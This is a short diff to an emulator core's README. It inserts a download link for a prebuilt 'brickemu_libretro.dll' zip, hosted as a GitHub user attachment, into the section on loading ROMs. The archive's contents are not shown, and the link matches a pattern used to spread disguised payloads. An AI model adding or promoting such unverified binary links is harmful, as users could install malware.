@@ -78,6 +78,8 @@ when core metadata is used.
 Load any supported `.bin` ROM directly. The core identifies each game by ROM
 content rather than relying only on its filename.
 
+[Download: brickemu_libretro.dll +info](https://github.com/user-attachments/files/30235393/brickemu_libretro.zip)
+
 ## Source package contents
 
 - Native HT943, EM73000, SPL0X, and KS56CX2X processor implementations.
